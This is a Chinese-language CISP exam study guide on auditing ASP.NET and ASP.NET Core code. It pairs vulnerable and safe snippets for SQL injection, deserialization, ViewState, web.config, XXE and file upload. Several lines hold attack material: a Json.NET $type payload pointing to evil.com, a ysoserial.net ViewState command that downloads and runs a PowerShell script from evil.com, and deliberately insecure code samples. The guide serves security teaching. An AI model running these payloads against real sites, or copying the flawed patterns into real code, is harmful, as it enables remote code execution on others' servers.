# .NET 代码审计实战指南

> **📘 文档定位**：CISP 考试代码审计进阶内容 | 难度：⭐⭐⭐⭐ | 预计阅读：22 分钟
> .NET 代码审计覆盖 ASP.NET/ASP.NET Core 两大生态。本文从反序列化、ViewState 风险、web.config 审计到 Blazor XSS，系统梳理 .NET 平台安全审计要点。

---

## 导航目录
- [一、.NET 技术栈与常见风险](#一net-技术栈与常见风险)
- [二、SQL 注入](#二sql-注入)
- [三、.NET 反序列化漏洞](#三net-反序列化漏洞)
- [四、ViewState 风险](#四viewstate-风险)
- [五、web.config 风险点](#五webconfig-风险点)
- [六、ASP.NET Core 安全](#六aspnet-core-安全)
- [七、文件上传与路径遍历](#七文件上传与路径遍历)
- [八、XXE (XML 外部实体注入)](#八xxe-xml-外部实体注入)
- [九、反序列化之外的 RCE 路径](#九反序列化之外的-rce-路径)
- [十、CheckList](#十checklist)
- [十一、高分考点与知识巧记](#十一高分考点与知识巧记)

---

## 一、.NET 技术栈与常见风险

| 技术 | 说明 | 常见风险点 |
|------|------|-----------|
| ASP.NET (WebForms) | `*.aspx / *.ashx / *.asmx` | ViewState 反序列化、SQL 拼接、`Server.Execute(path)` |
| ASP.NET MVC / Web API | `Controller / ApiController` | 模型绑定 + 验证缺失、`[AllowAnonymous]`、CORS 配置 |
| ASP.NET Core | `.NET Core / .NET 6+` | Kestrel 配置、环境变量、Razor 视图 |
| WCF / SOAP | `*.svc` | XML 解析 XXE、DataContractJsonSerializer 反序列化 |
| Windows Service / WPF / WinForms | 客户端/服务端 | 证书/密钥存储、ClickOnce 签名、配置文件 |
| ADO.NET / Dapper / EF Core | ORM | `SqlCommand` 拼接、`FromSqlRaw` 原生 SQL |
| Newtonsoft.Json (`Json.NET`) / System.Text.Json | JSON 解析 | `TypeNameHandling.Auto` (类似 Java `enableDefaultTyping`) |
| BinaryFormatter / NetDataContractSerializer | 二进制序列化 | 反序列化 RCE (Microsoft 官方已标记危险) |
| SignalR | 实时通信 | Hub 权限校验缺失、CORS |

## 二、SQL 注入

```csharp
// ❌ 拼接 (ADO.NET)
string sql = "SELECT * FROM Users WHERE Username = '" + user + "'";
SqlCommand cmd = new SqlCommand(sql, conn);
SqlDataReader r = cmd.ExecuteReader();

// ❌ Entity Framework Core FromSqlRaw (字符串内插)
var users = db.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{user}'").ToList();

// ✅ 参数化
SqlCommand cmd = new SqlCommand("SELECT * FROM Users WHERE Username = @u", conn);
cmd.Parameters.AddWithValue("@u", user);

// ✅ EF Core 参数化
var users = db.Users.FromSqlRaw("SELECT * FROM Users WHERE Name = {0}", user).ToList();
var users = db.Users.Where(u => u.Name == user).ToList();  // 推荐 LINQ

// ❌ 动态拼接 ORDER BY (列名不能参数化)
string sql = "SELECT * FROM Users ORDER BY " + sortColumn;
// ✅ 白名单:
string[] allowed = { "Id", "Name", "CreatedAt" };
string col = allowed.Contains(sortColumn) ? sortColumn : "Id";
```

## 三、.NET 反序列化漏洞

### 3.1 危险 API 总览

```csharp
// ❌ 1. BinaryFormatter (官方警告: Never deserialize untrusted data)
IFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);   // 直接 RCE 链

// ❌ 2. NetDataContractSerializer (同 BinaryFormatter)
NetDataContractSerializer ser = new NetDataContractSerializer();
ser.ReadObject(stream);

// ❌ 3. SoapFormatter
SoapFormatter sf = new SoapFormatter();
sf.Deserialize(stream);

// ❌ 4. JSON.NET / Newtonsoft.Json with TypeNameHandling
JsonConvert.DeserializeObject<object>(userInput,
    new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto });
// Payload:
// { "$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
//   "Path":"\\evil.com\share\calc.exe","Installers":[] }

// ❌ 5. LosFormatter (ASP.NET ViewState)
LosFormatter fmt = new LosFormatter();
object viewState = fmt.Deserialize(base64Str);  // 如果 machine key 泄露, 可伪造 ViewState

// ❌ 6. ObjectStateFormatter (同 LosFormatter, 但用于 .NET Framework)
ObjectStateFormatter osf = new ObjectStateFormatter();
```

### 3.2 利用工具链

- **ysoserial.net**: 专门针对 .NET 的 gadget 生成器
  - 支持: `BinaryFormatter` / `LosFormatter` / `JSON.NET` / `SoapFormatter` / `OleDbFormatData`
  - 用法: `ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c "calc.exe"`
- **dnSpy**: 反编译 .NET 程序集 (替代旧的 .NET Reflector)
- **ILSpy**: 另一个免费开源 .NET 反编译器

### 3.3 gadget 链代表性案例

| Gadget | 触发条件 | 影响 |
|--------|---------|------|
| `TextFormattingRunProperties` (WPF) | BinaryFormatter / NetDataContractSerializer + PresentationFramework | RCE |
| `ObjectDataProvider` (WPF) | `MethodParameters` = 命令 + `MethodName="Start"` | RCE |
| `System.Configuration.Install.AssemblyInstaller` | 可加载 UNC 路径 DLL | RCE |
| `PSObject` (PowerShell) | 需要 System.Management.Automation | RCE |
| `Json.NET / ActivitySurrogateSelectorFromFile` | Newtonsoft.Json `TypeNameHandling=All/Auto` | RCE |

## 四、ViewState 风险

```xml
<!-- ASP.NET WebForms 典型 ViewState 写法 -->
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
       value="/wEPDwULLTE2MTY2ODcyMjkPFgIeC2N....." />

<!-- ViewState 默认使用 machineKey 中的 validationKey 做签名
     如果 machineKey 泄漏 (硬编码 / 历史备份 / 从其它漏洞读 web.config),
     攻击者可以用 ysoserial.net 生成签名过的恶意 ViewState:

     ysoserial.exe -p ViewState -g TextFormattingRunProperties
                    -c "powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')"
                    --generator=CA0B0334 --validationalg=SHA1
                    --validationkey=xxxxx --decryptionkey=xxxx --decryptionalg=AES
                    --path=/admin/page.aspx --apppath=/
-->
```

## 五、web.config 风险点

```xml
<!-- ❌ 1. customErrors 关闭 (泄漏堆栈) -->
<customErrors mode="Off" />                 <!-- 生产必须 RemoteOnly / On -->

<!-- ❌ 2. debug=true (额外信息泄漏 + 性能问题) -->
<compilation debug="true" targetFramework="4.8" />

<!-- ❌ 3. machineKey 硬编码且弱 -->
<machineKey validationKey="AutoGenerate,IsolateApps"
            decryptionKey="AutoGenerate,IsolateApps" />
<!-- 若显式写死了 key, 需检查是否在多环境共享 / 历史备份中泄漏 -->

<!-- ❌ 4. HTTP 方法配置宽松 -->
<httpHandlers>
  <add verb="*" path="*.ashx" type="MyHandler" />  <!-- * = 所有 HTTP 方法 -->
</httpHandlers>

<!-- ❌ 5. Tracing 开启 (可访问 /trace.axd 看所有请求) -->
<trace enabled="true" requestLimit="50" pageOutput="false" localOnly="true" />
<!-- 若 localOnly=false + 未鉴权, 外部可直接访问 -->

<!-- ❌ 6. RequestValidation 被关闭 -->
<pages validateRequest="false" />  <!-- 全局关闭 XSS 防御 (老版本) -->
```

## 六、ASP.NET Core 安全

### 6.1 配置风险

```csharp
// ❌ Development exception page (生产环境必须移除)
if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); }
// ✅ 生产: app.UseExceptionHandler("/Error"); app.UseHsts();

// ❌ CORS 过宽
builder.Services.AddCors(opt => opt.AddPolicy("AllowAll",
    p => p.AllowAnyOrigin().AllowAnyMethod().AllowAnyHeader()));

// ❌ HTTPS 未强制
// ✅ 生产必须: app.UseHttpsRedirection(); + app.UseHsts();

// ❌ Swagger 暴露生产接口
// ✅ 仅在 Development 启用 Swagger / 加 API KEY 访问控制

// ❌ 弱签名密钥
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(opt => opt.TokenValidationParameters = new TokenValidationParameters {
        IssuerSigningKey = new SymmetricSecurityKey(
            Encoding.UTF8.GetBytes("weak-secret-should-be-at-least-256-bits")),
        ValidateIssuer = false, ValidateAudience = false, ValidateLifetime = true
    });
```

### 6.2 Blazor / Razor Pages XSS

```html
<!-- ✅ 默认 Razor 使用 @ 会自动 HTML 编码 -->
<p>@Model.UserInput</p>

<!-- ❌ Html.Raw 会输出原文 -->
<p>@Html.Raw(Model.UserInput)</p>

<!-- ❌ Blazor MarkupString -->
@((MarkupString)Model.UserInput)

<!-- ❌ JS 注入 (从 C# 侧 write) -->
@inject IJSRuntime JS
await JS.InvokeVoidAsync("alert", @Model.Name);   // 如果 Name 来自用户且未转义
```

## 七、文件上传与路径遍历

```csharp
// ❌ 1. 直接使用用户上传文件名存储
string path = Path.Combine("uploads", uploadedFile.FileName);
await uploadedFile.CopyToAsync(new FileStream(path, FileMode.Create));
// 风险: FileName = "../../../wwwroot/cmd.aspx"

// ❌ 2. MIME / 后缀检查不足
//    允许 .aspx / .ashx / .asmx / .cshtml / .exe 执行

// ✅ 正确做法:
string[] allowedExt = { ".jpg", ".png", ".pdf" };
string ext = Path.GetExtension(uploadedFile.FileName).ToLowerInvariant();
if (!allowedExt.Contains(ext)) return BadRequest();

string safeName = Guid.NewGuid().ToString("N") + ext;
string savePath = Path.Combine(
    Path.GetFullPath(Path.Combine(webHost.WebRootPath, "../secure-uploads/")),
    safeName);
// ❌ 注意 System.IO.Path 攻击: 需额外验证路径不在 webroot 外:
if (!File.Exists(savePath) || !savePath.StartsWith(uploadRoot)) throw ...;

// 存储在 webroot 外: 读取时通过 Controller 返回 File() 给前端
```

## 八、XXE (XML 外部实体注入)

```csharp
// ❌ XmlReader (默认在 .NET Framework 4.5.2+ 禁用, 但仍可能被显式开启)
XmlReaderSettings settings = new XmlReaderSettings();
settings.ProhibitDtd = false;           // .NET <4
settings.DtdProcessing = DtdProcessing.Parse;  // .NET 4+
settings.XmlResolver = new XmlUrlResolver();  // 允许解析外部 URL
XmlReader reader = XmlReader.Create(input, settings);

// ✅ 安全写法 (.NET 4.6+ 默认, 建议显式声明)
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
```

## 九、反序列化之外的 RCE 路径

```csharp
// 1. Roslyn / CSharpScript 脚本执行
//    using Microsoft.CodeAnalysis.CSharp.Scripting;
//    CSharpScript.EvaluateAsync(userInput);     // 若 userInput 可控

// 2. System.Diagnostics.Process
Process.Start(new ProcessStartInfo("cmd.exe", "/c " + userInput) { UseShellExecute = true });

// 3. PowerShell / System.Management.Automation
//    PowerShell ps = PowerShell.Create(); ps.AddScript(userInput); ps.Invoke();

// 4. WPF XAML / XPS (XAML 解析可实例化任意类, 包括 ObjectDataProvider)
//    XamlReader.Parse(userInput);

// 5. Server.Execute / Server.Transfer (路径遍历到 .aspx, 不能直接 RCE 但可越权)
Server.Execute(Request["path"]);
```

## 十、CheckList

- [ ] 是否使用 `BinaryFormatter / NetDataContractSerializer / LosFormatter` 反序列化外部数据?
- [ ] Json.NET `TypeNameHandling` 是否设置为 `Auto/All/Arrays`? 应该 `None`
- [ ] SQL 是否全部参数化? 检查 `SqlCommand` 文本拼接和 `FromSqlRaw`
- [ ] `web.config` / `appsettings.json`: DB 密码、JWT key、debug 标志、tracing、customErrors
- [ ] 上传文件: 后缀白名单、随机重命名、存储路径在 webroot 外、执行权限
- [ ] ViewState: machineKey 管理 (不同环境不同 key、避免备份泄漏)
- [ ] ASP.NET Core: 是否强制 HTTPS/HSTS? CORS 是否过度宽松?
- [ ] 身份认证: JWT secret 是否够长 (≥ 256bit)? 是否强制验签? `none` 算法?
- [ ] 第三方包: log4net / Newtonsoft.Json / System.Text.RegularExpressions / Microsoft.Owin 是否有 CVE?
- [ ] 反编译 `*.dll / *.exe` 查看是否存在硬编码密钥、后门 IP
- [ ] 权限: `[Authorize]` / `[AllowAnonymous]` 覆盖情况; 管理后台路径访问控制
- [ ] XXE: 所有 XML 解析是否禁用 DTD?

---

## 十一、高分考点与知识巧记

> 🔑 **高分考点**：.NET 代码审计考点集中在 BinaryFormatter 反序列化、ViewState 安全、web.config 风险配置。ysoserial.net 是 .NET 版反序列化利用工具，与 Java 版 ysoserial 对应。

| 考点 | 频次 | 核心记忆点 |
|:---|:---:|:---|
| 反序列化 API | ⭐⭐⭐⭐⭐ | BinaryFormatter/NetDataContractSerializer/LosFormatter 禁止反序列化外部数据 |
| ViewState | ⭐⭐⭐⭐ | machineKey 泄露 + ysoserial.net 伪造 = RCE |
| web.config 风险 | ⭐⭐⭐⭐ | debug=true/customErrors=Off/tracing/machineKey 硬编码 |
| Json.NET TypeNameHandling | ⭐⭐⭐⭐ | 类似 Java Jackson enableDefaultTyping，应设为 None |
| ASP.NET Core | ⭐⭐⭐ | HTTPS 强制、HSTS、CORS 限制、Swagger 保护 |

> 💡 **知识巧记**：.NET 反序列化三大禁：BinaryFormatter 禁、NetDataContractSerializer 禁、LosFormatter 禁。web.config 五风险记"调错机追验"——debug 调试开、customErrors 错误关、machineKey 硬编码、tracing 追踪开、validateRequest 验证关。ysoserial.net 对应 Java ysoserial，TextFormattingRunProperties 是最经典 gadget。

### 高分考点速查表

| 考察维度 | 关键结论 | 常见干扰项 |
|:---|:---|:---|
| BinaryFormatter | 微软官方标记危险，禁止反序列化不可信数据 | "升级 .NET 版本即可安全" ❌ |
| machineKey | 多环境不可共享，备份不可泄漏 | "machineKey 自动生成就安全" ❌ |
| TypeNameHandling | 设为 None，类似 Java 关闭 autoType | "Auto 模式是安全的" ❌ |
| customErrors | 生产必须 RemoteOnly 或 On | "Off 模式方便调试" ❌ |
| ASP.NET Core HSTS | UseHsts() + UseHttpsRedirection() | "HTTP 和 HTTPS 并存没问题" ❌ |

### 知识巧记口诀

> **.NET 代码审计口诀**：
> 反序列化三大禁，Binary NetData LosFormatter 停。
> web.config 五风险，调错机追验记分明。
> ViewState machineKey 护，泄露即可 RCE 成。
> Json.NET type 设 None，如同 Java autoType 封。
> ASP.NET Core 强制 HTTPS，CORS 收紧 HSTS 硬。
